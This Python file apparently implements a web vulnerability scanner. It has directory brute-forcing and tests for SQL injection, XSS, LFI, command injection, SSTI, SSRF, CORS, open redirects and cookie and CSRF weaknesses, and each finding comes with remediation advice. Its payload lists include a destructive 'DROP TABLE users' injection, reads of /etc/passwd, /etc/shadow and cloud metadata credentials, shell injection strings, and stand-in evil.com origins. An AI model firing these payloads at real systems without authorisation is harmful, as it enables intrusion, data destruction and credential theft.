import socket
import ssl
import re
from datetime import datetime

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

WORDLISTS = {
    "common": [
        "admin", "login", "dashboard", "wp-admin", "wp-login.php", "administrator",
        "phpmyadmin", "panel", "cpanel", "webmail", "mail", "ftp", "upload",
        "uploads", "images", "img", "css", "js", "static", "media", "files",
        "backup", "backups", "old", "new", "test", "dev", "staging", "api",
        "v1", "v2", "v3", "swagger", "docs", "documentation", "help", "support",
        "user", "users", "account", "accounts", "profile", "register", "signup",
        "signin", "logout", "config", "configuration", "settings", "setup",
        ".git", ".env", ".htaccess", "robots.txt", "sitemap.xml", "crossdomain.xml",
        "server-status", "server-info", "phpinfo.php", "info.php", "readme.txt",
        "README.md", "CHANGELOG", "LICENSE", "Makefile", "package.json",
        "composer.json", "requirements.txt", "Dockerfile", ".dockerignore",
        "error_log", "access_log", "debug.log", "app.log",
    ],
    "extended": [
        "shell.php", "cmd.php", "webshell.php", "backdoor.php", "c99.php", "r57.php",
        "upload.php", "file_manager.php", "manager.php", "filemanager",
        "adminer.php", "adminer", "db.php", "database.php", "sql.php",
        "passwd", "shadow", "id_rsa", "id_dsa", ".bash_history", ".ssh",
        "wp-config.php", "config.php", "configuration.php", "settings.php",
        "local.xml", "config.xml", "web.config", "appsettings.json",
        "dump.sql", "backup.sql", "db_backup.sql", "database.sql",
        "aws.json", "credentials", ".aws", "google-services.json",
        "actuator", "actuator/env", "actuator/health", "actuator/mappings",
        "graphql", "graphiql", "api/graphql", "_graphql", "api/v1/users",
        "api/v2/users", "api/admin", "api/debug", "api/config",
        "console", "rails/info/properties", "telescope", "horizon",
        "_profiler", "_wdt", "trace", "metrics", "health", "info",
        "status", "ping", "version", "env", "debug", "trace",
    ],
}

SQLI_PAYLOADS = [
    "' OR '1'='1", "' OR 1=1--", "\" OR \"1\"=\"1",
    "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "1; SELECT SLEEP(5)--", "1'; WAITFOR DELAY '0:0:5'--",
    "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
    "'; DROP TABLE users--",
    "1 AND 1=1", "1 AND 1=2",
]

SQLI_ERRORS = [
    "sql syntax", "mysql_fetch", "you have an error in your sql",
    "warning: mysql", "unclosed quotation mark", "quoted string not properly terminated",
    "syntax error", "ora-", "pg_query", "sqlite_", "microsoft ole db",
    "odbc sql", "jdbc", "sqlstate", "db2 sql", "invalid query",
    "supplied argument is not a valid mysql", "column count doesn't match",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "'\"><script>alert('XSS')</script>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<body onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "\"><img src=1 onerror=alert(1)>",
]


def _req(url, **kwargs):
    if not REQUESTS_AVAILABLE:
        raise RuntimeError("requests not installed")
    import requests as req
    return req.get(url, timeout=8, verify=False, **kwargs)


def dir_bruteforce(base_url: str, wordlist_key: str = "common") -> dict:
    if not base_url.startswith(("http://", "https://")):
        base_url = "https://" + base_url
    base_url = base_url.rstrip("/")

    result = {"target": base_url, "timestamp": datetime.utcnow().isoformat(), "found": [], "errors": []}
    words = WORDLISTS.get(wordlist_key, WORDLISTS["common"])

    if not REQUESTS_AVAILABLE:
        return {"error": "requests library not installed"}

    import requests as req
    session = req.Session()
    session.verify = False

    for word in words:
        url = f"{base_url}/{word}"
        try:
            r = session.get(url, timeout=5, allow_redirects=False)
            if r.status_code not in (404, 400):
                result["found"].append({
                    "url": url,
                    "status": r.status_code,
                    "size": len(r.content),
                    "redirect": r.headers.get("Location", ""),
                })
        except Exception as e:
            result["errors"].append(str(e)[:80])

    result["count"] = len(result["found"])
    result["scanned"] = len(words)
    return result


def sqli_test(url: str) -> dict:
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    result = {"target": url, "timestamp": datetime.utcnow().isoformat(), "vulnerabilities": [], "info": []}

    if not REQUESTS_AVAILABLE:
        return {"error": "requests library not installed"}

    import requests as req

    try:
        base_r = req.get(url, timeout=8, verify=False)
    except Exception as e:
        return {"error": str(e)}

    for payload in SQLI_PAYLOADS[:8]:
        test_url = url + ("&" if "?" in url else "?") + f"id={payload}"
        try:
            r = req.get(test_url, timeout=8, verify=False)
            body = r.text.lower()
            for err in SQLI_ERRORS:
                if err in body:
                    result["vulnerabilities"].append({
                        "type": "SQL Injection",
                        "payload": payload,
                        "evidence": err,
                        "url": test_url,
                        "severity": "CRITICAL",
                    })
                    break
        except Exception:
            pass

    if not result["vulnerabilities"]:
        result["info"].append("No obvious SQL injection errors detected with basic payloads.")

    return result


def xss_test(url: str) -> dict:
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    result = {"target": url, "timestamp": datetime.utcnow().isoformat(), "vulnerabilities": [], "info": []}

    if not REQUESTS_AVAILABLE:
        return {"error": "requests library not installed"}

    import requests as req

    for payload in XSS_PAYLOADS:
        test_url = url + ("&" if "?" in url else "?") + f"q={payload}"
        try:
            r = req.get(test_url, timeout=8, verify=False)
            if payload.lower() in r.text.lower():
                result["vulnerabilities"].append({
                    "type": "Reflected XSS",
                    "payload": payload,
                    "url": test_url,
                    "severity": "HIGH",
                })
        except Exception:
            pass

    if not result["vulnerabilities"]:
        result["info"].append("No reflected XSS detected with basic payloads.")

    return result


def ssl_check(host: str) -> dict:
    if host.startswith(("http://", "https://")):
        host = re.sub(r"https?://", "", host).split("/")[0]

    result = {"host": host, "timestamp": datetime.utcnow().isoformat()}
    port = 443

    try:
        ctx = ssl.create_default_context()
        with socket.create_connection((host, port), timeout=10) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                cert   = ssock.getpeercert()
                cipher = ssock.cipher()
                proto  = ssock.version()
                result["valid"]      = True
                result["protocol"]   = proto
                result["cipher"]     = {"name": cipher[0], "protocol": cipher[1], "bits": cipher[2]}
                result["subject"]    = dict(x[0] for x in cert.get("subject", []))
                result["issuer"]     = dict(x[0] for x in cert.get("issuer", []))
                result["not_before"] = cert.get("notBefore")
                result["not_after"]  = cert.get("notAfter")
                result["san"]        = [v for t, v in cert.get("subjectAltName", [])]
                issues = []
                if proto in ("SSLv2", "SSLv3", "TLSv1", "TLSv1.1"):
                    issues.append(f"Outdated protocol: {proto}")
                if cipher[2] and cipher[2] < 128:
                    issues.append(f"Weak cipher key length: {cipher[2]} bits")
                result["issues"] = issues
    except ssl.SSLCertVerificationError as e:
        result["valid"] = False
        result["error"] = str(e)
    except Exception as e:
        result["error"] = str(e)

    return result


TECH_SIGNATURES = {
    "WordPress": ["wp-content", "wp-includes", "WordPress"],
    "Joomla": ["joomla", "/components/com_"],
    "Drupal": ["Drupal", "/sites/default/"],
    "Laravel": ["laravel_session", "Laravel"],
    "Django": ["csrftoken", "django"],
    "React": ["react", "ReactDOM", "__react"],
    "Vue.js": ["vue.js", "Vue.js", "__vue"],
    "Angular": ["ng-version", "angular.js"],
    "jQuery": ["jquery", "jQuery"],
    "Bootstrap": ["bootstrap.css", "bootstrap.min.css"],
    "Nginx": ["nginx"],
    "Apache": ["Apache", "apache"],
    "IIS": ["Microsoft-IIS"],
    "PHP": ["X-Powered-By: PHP", ".php"],
    "ASP.NET": ["ASP.NET", "X-AspNet"],
    "Node.js": ["X-Powered-By: Express", "Express"],
    "Cloudflare": ["cf-ray", "cloudflare"],
    "AWS": ["x-amz-", "AmazonS3", "cloudfront"],
}


def tech_detect(url: str) -> dict:
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    result = {"url": url, "timestamp": datetime.utcnow().isoformat(), "technologies": []}

    if not REQUESTS_AVAILABLE:
        return {"error": "requests library not installed"}

    try:
        import requests as req
        r = req.get(url, timeout=10, verify=False)
        content     = r.text
        headers_str = str(r.headers).lower()
        all_text    = content + headers_str

        for tech, sigs in TECH_SIGNATURES.items():
            for sig in sigs:
                if sig.lower() in all_text.lower():
                    if tech not in result["technologies"]:
                        result["technologies"].append(tech)
                    break

        result["server"]       = r.headers.get("Server", "Unknown")
        result["powered_by"]   = r.headers.get("X-Powered-By", "Not disclosed")
        result["status_code"]  = r.status_code
        result["content_type"] = r.headers.get("Content-Type", "Unknown")
    except Exception as e:
        result["error"] = str(e)

    return result


# ── New attack tools ──────────────────────────────────────────────────────────

CORS_ORIGINS = [
    "https://evil.com", "https://attacker.com", "null",
    "https://trusted.com.evil.com", "http://localhost",
]

def cors_check(url: str) -> dict:
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    result = {"url": url, "timestamp": datetime.utcnow().isoformat(), "vulnerabilities": [], "info": []}
    if not REQUESTS_AVAILABLE:
        return {"error": "requests not installed"}
    try:
        import requests as req
        for origin in CORS_ORIGINS:
            r = req.get(url, headers={"Origin": origin}, timeout=8, verify=False)
            acao = r.headers.get("Access-Control-Allow-Origin", "")
            acac = r.headers.get("Access-Control-Allow-Credentials", "").lower()
            if acao == origin or acao == "*":
                severity = "HIGH" if (acac == "true" and acao != "*") else "MEDIUM"
                result["vulnerabilities"].append({
                    "type": "CORS Misconfiguration",
                    "origin_tested": origin,
                    "acao_header": acao,
                    "credentials_allowed": acac == "true",
                    "severity": severity,
                    "evidence": f"Origin: {origin} → ACAO: {acao}, ACAC: {acac}",
                    "remediation": "Restrict Access-Control-Allow-Origin to trusted origins only.",
                })
        result["info"].append(f"Tested {len(CORS_ORIGINS)} origins")
    except Exception as e:
        result["error"] = str(e)
    return result


REDIRECT_PARAMS = ["redirect", "url", "next", "return", "returnUrl", "goto",
                   "dest", "destination", "continue", "redir", "redirect_uri", "back"]

def open_redirect_test(url: str) -> dict:
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    result = {"url": url, "timestamp": datetime.utcnow().isoformat(), "vulnerabilities": [], "info": []}
    if not REQUESTS_AVAILABLE:
        return {"error": "requests not installed"}
    try:
        import requests as req
        payloads = ["https://evil.com", "//evil.com", r"\/\/evil.com", "https://evil.com%2F@target.com"]
        for param in REDIRECT_PARAMS[:6]:
            for payload in payloads[:2]:
                test_url = url + ("&" if "?" in url else "?") + f"{param}={payload}"
                try:
                    r = req.get(test_url, timeout=5, verify=False, allow_redirects=False)
                    loc = r.headers.get("Location", "")
                    if "evil.com" in loc:
                        result["vulnerabilities"].append({
                            "type": "Open Redirect",
                            "parameter": param, "payload": payload,
                            "location_header": loc, "severity": "MEDIUM",
                            "url": test_url,
                            "remediation": "Validate and whitelist redirect destinations server-side.",
                        })
                except Exception:
                    pass
        if not result["vulnerabilities"]:
            result["info"].append("No open redirects detected with common parameters.")
    except Exception as e:
        result["error"] = str(e)
    return result


def clickjacking_test(url: str) -> dict:
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    result = {"url": url, "timestamp": datetime.utcnow().isoformat(), "vulnerable": False,
              "info": {}, "vulnerabilities": []}
    if not REQUESTS_AVAILABLE:
        return {"error": "requests not installed"}
    try:
        import requests as req
        r = req.get(url, timeout=8, verify=False)
        xfo           = r.headers.get("X-Frame-Options", "MISSING")
        csp           = r.headers.get("Content-Security-Policy", "")
        has_csp_frame = "frame-ancestors" in csp.lower()
        result["info"] = {
            "X-Frame-Options": xfo,
            "CSP-frame-ancestors": "present" if has_csp_frame else "MISSING",
        }
        if xfo == "MISSING" and not has_csp_frame:
            result["vulnerable"] = True
            result["vulnerabilities"].append({
                "type": "Clickjacking",
                "severity": "MEDIUM",
                "evidence": "X-Frame-Options: MISSING, CSP frame-ancestors: MISSING",
                "remediation": "Add X-Frame-Options: DENY or CSP: frame-ancestors 'none'.",
            })
    except Exception as e:
        result["error"] = str(e)
    return result


HTTP_DANGEROUS = ["PUT", "DELETE", "PATCH", "TRACE", "CONNECT", "DEBUG", "MOVE"]

def http_methods_test(url: str) -> dict:
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    result = {"url": url, "timestamp": datetime.utcnow().isoformat(),
              "allowed": [], "dangerous": [], "vulnerabilities": []}
    if not REQUESTS_AVAILABLE:
        return {"error": "requests not installed"}
    try:
        import requests as req
        for method in HTTP_DANGEROUS + ["GET", "HEAD", "POST", "OPTIONS"]:
            try:
                r = req.request(method, url, timeout=5, verify=False)
                if r.status_code not in (405, 501, 400):
                    result["allowed"].append({"method": method, "status": r.status_code})
                    if method in HTTP_DANGEROUS:
                        result["dangerous"].append(method)
                        result["vulnerabilities"].append({
                            "type": f"Dangerous HTTP Method: {method}",
                            "severity": "HIGH" if method in ("PUT","DELETE","DEBUG","TRACE") else "MEDIUM",
                            "evidence": f"{method} returned HTTP {r.status_code}",
                            "remediation": f"Disable {method} on the web server configuration.",
                        })
            except Exception:
                pass
    except Exception as e:
        result["error"] = str(e)
    return result


LFI_PAYLOADS = [
    "../../../etc/passwd", "../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd", "....//....//etc/passwd",
    "../../../windows/win.ini", "..\\..\\..\\windows\\win.ini",
    "/etc/passwd", "/etc/hosts", "/proc/self/environ",
    "php://filter/convert.base64-encode/resource=index.php",
    "../../../etc/shadow", "/var/log/apache2/access.log",
]
LFI_INDICATORS = ["root:x:", "daemon:", "[extensions]", "www-data", "/bin/bash",
                  "/bin/sh", "proc/self", "[boot loader]", "/sbin/nologin"]

def lfi_test(url: str) -> dict:
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    result = {"url": url, "timestamp": datetime.utcnow().isoformat(), "vulnerabilities": [], "info": []}
    if not REQUESTS_AVAILABLE:
        return {"error": "requests not installed"}
    try:
        import requests as req
        params = ["file", "page", "path", "include", "template", "doc", "document", "view", "load", "read", "lang"]
        for param in params[:5]:
            for payload in LFI_PAYLOADS[:6]:
                test_url = url + ("&" if "?" in url else "?") + f"{param}={payload}"
                try:
                    r = req.get(test_url, timeout=6, verify=False)
                    for ind in LFI_INDICATORS:
                        if ind in r.text:
                            result["vulnerabilities"].append({
                                "type": "Local File Inclusion (LFI)",
                                "parameter": param, "payload": payload,
                                "indicator": ind, "severity": "CRITICAL",
                                "url": test_url,
                                "remediation": "Sanitise file path inputs. Use whitelists. Disable allow_url_include.",
                            })
                            break
                except Exception:
                    pass
        if not result["vulnerabilities"]:
            result["info"].append("No LFI detected with common payloads.")
    except Exception as e:
        result["error"] = str(e)
    return result


CMD_PAYLOADS = [
    (";id",       ["uid=", "gid="]),
    ("|id",       ["uid=", "gid="]),
    ("&&id",      ["uid=", "gid="]),
    (";whoami",   ["root", "www-data", "apache", "nobody"]),
    ("|whoami",   ["root", "www-data", "apache"]),
    ("$(id)",     ["uid=", "gid="]),
    ("`id`",      ["uid=", "gid="]),
    (";sleep 3",  []),   # time-based
]

def cmd_injection_test(url: str) -> dict:
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    result = {"url": url, "timestamp": datetime.utcnow().isoformat(), "vulnerabilities": [], "info": []}
    if not REQUESTS_AVAILABLE:
        return {"error": "requests not installed"}
    try:
        import requests as req
        import time
        params = ["cmd", "exec", "command", "run", "ping", "host", "ip", "query", "search", "input", "c"]
        for param in params[:4]:
            for payload, indicators in CMD_PAYLOADS[:6]:
                test_url = url + ("&" if "?" in url else "?") + f"{param}={payload}"
                try:
                    t0 = time.time()
                    r  = req.get(test_url, timeout=8, verify=False)
                    elapsed = time.time() - t0
                    for ind in indicators:
                        if ind in r.text:
                            result["vulnerabilities"].append({
                                "type": "Command Injection",
                                "parameter": param, "payload": payload,
                                "indicator": ind, "severity": "CRITICAL",
                                "url": test_url,
                                "evidence": r.text[:300],
                                "remediation": "Never pass user input to shell commands. Use safe APIs instead.",
                            })
                            break
                    if not indicators and elapsed > 2.5:
                        result["vulnerabilities"].append({
                            "type": "Blind Command Injection (time-based)",
                            "parameter": param, "payload": payload,
                            "severity": "CRITICAL", "url": test_url,
                            "evidence": f"Response delayed {elapsed:.1f}s",
                            "remediation": "Never pass user input to shell commands.",
                        })
                except Exception:
                    pass
        if not result["vulnerabilities"]:
            result["info"].append("No command injection detected with basic payloads.")
    except Exception as e:
        result["error"] = str(e)
    return result


SSTI_PAYLOADS = [
    ("{{7*7}}", "49"), ("${7*7}", "49"), ("<%= 7*7 %>", "49"),
    ("#{7*7}", "49"), ("{{7*'7'}}", "7777777"), ("*{7*7}", "49"),
    ("{{config}}", "SECRET"), ("{php}echo(7*7);{/php}", "49"),
]

def ssti_test(url: str) -> dict:
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    result = {"url": url, "timestamp": datetime.utcnow().isoformat(), "vulnerabilities": [], "info": []}
    if not REQUESTS_AVAILABLE:
        return {"error": "requests not installed"}
    try:
        import requests as req
        params = ["name", "template", "message", "query", "q", "search", "input", "text", "content", "subject"]
        for param in params[:4]:
            for payload, expected in SSTI_PAYLOADS[:6]:
                test_url = url + ("&" if "?" in url else "?") + f"{param}={payload}"
                try:
                    r = req.get(test_url, timeout=6, verify=False)
                    if expected in r.text:
                        result["vulnerabilities"].append({
                            "type": "Server-Side Template Injection (SSTI)",
                            "parameter": param, "payload": payload,
                            "expected": expected, "severity": "CRITICAL",
                            "url": test_url,
                            "remediation": "Use sandboxed template engines. Never pass user input directly to templates.",
                        })
                except Exception:
                    pass
        if not result["vulnerabilities"]:
            result["info"].append("No SSTI detected with common payloads.")
    except Exception as e:
        result["error"] = str(e)
    return result


SSRF_TARGETS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://localhost/",
    "http://127.0.0.1/",
    "http://0.0.0.0/",
]
SSRF_INDICATORS = ["ami-id", "instance-id", "computeMetadata", "local-hostname",
                   "iam/security-credentials", "meta-data", "placement"]

def ssrf_test(url: str) -> dict:
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    result = {"url": url, "timestamp": datetime.utcnow().isoformat(), "vulnerabilities": [], "info": []}
    if not REQUESTS_AVAILABLE:
        return {"error": "requests not installed"}
    try:
        import requests as req
        params = ["url", "link", "src", "source", "dest", "destination", "fetch", "load", "uri", "resource", "file"]
        for param in params[:4]:
            for target in SSRF_TARGETS[:3]:
                test_url = url + ("&" if "?" in url else "?") + f"{param}={target}"
                try:
                    r = req.get(test_url, timeout=5, verify=False)
                    for ind in SSRF_INDICATORS:
                        if ind in r.text:
                            result["vulnerabilities"].append({
                                "type": "Server-Side Request Forgery (SSRF)",
                                "parameter": param, "payload": target,
                                "indicator": ind, "severity": "CRITICAL",
                                "url": test_url,
                                "remediation": "Validate and restrict URLs fetched server-side. Block cloud metadata IPs.",
                            })
                            break
                except Exception:
                    pass
        if not result["vulnerabilities"]:
            result["info"].append("No SSRF detected with cloud metadata payloads.")
    except Exception as e:
        result["error"] = str(e)
    return result


def cookie_analyzer(url: str) -> dict:
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    result = {"url": url, "timestamp": datetime.utcnow().isoformat(),
              "cookies": [], "vulnerabilities": [], "info": []}
    if not REQUESTS_AVAILABLE:
        return {"error": "requests not installed"}
    try:
        import requests as req
        r = req.get(url, timeout=8, verify=False)
        for cookie in r.cookies:
            issues = []
            if not cookie.secure:
                issues.append("Secure flag missing")
            if not cookie.has_nonstandard_attr("HttpOnly"):
                issues.append("HttpOnly flag missing")
            samesite = cookie._rest.get("SameSite", "")
            if not samesite:
                issues.append("SameSite attribute missing")
            result["cookies"].append({
                "name": cookie.name,
                "secure": cookie.secure,
                "httponly": cookie.has_nonstandard_attr("HttpOnly"),
                "samesite": samesite or "Not set",
                "issues": issues,
            })
            for issue in issues:
                result["vulnerabilities"].append({
                    "type": f"Insecure Cookie: {issue}",
                    "cookie_name": cookie.name,
                    "severity": "HIGH" if "Secure" in issue else "MEDIUM",
                    "evidence": f"Cookie '{cookie.name}': {issue}",
                    "remediation": f"Set {issue.split()[0]} flag on cookie '{cookie.name}'.",
                })
        if not r.cookies:
            result["info"].append("No cookies found at this URL.")
    except Exception as e:
        result["error"] = str(e)
    return result


def csrf_check(url: str) -> dict:
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    result = {"url": url, "timestamp": datetime.utcnow().isoformat(),
              "info": {}, "vulnerabilities": []}
    if not REQUESTS_AVAILABLE:
        return {"error": "requests not installed"}
    try:
        import requests as req
        r = req.get(url, timeout=8, verify=False)
        content      = r.text.lower()
        csrf_tokens  = ["csrf", "_token", "csrftoken", "csrf_token", "authenticity_token",
                        "requestverificationtoken", "_csrf", "xsrf"]
        found_token  = any(tok in content for tok in csrf_tokens)
        samesite_ok  = any(c._rest.get("SameSite") in ("Strict","Lax") for c in r.cookies)
        forms        = content.count("<form")
        result["info"] = {
            "csrf_token_found": found_token,
            "samesite_cookies": samesite_ok,
            "forms_detected": forms,
        }
        if forms > 0 and not found_token and not samesite_ok:
            result["vulnerabilities"].append({
                "type": "Potential CSRF Vulnerability",
                "severity": "HIGH",
                "evidence": f"{forms} form(s), no CSRF token, no SameSite cookies",
                "remediation": "Implement synchroniser token pattern on all state-changing forms.",
            })
    except Exception as e:
        result["error"] = str(e)
    return result
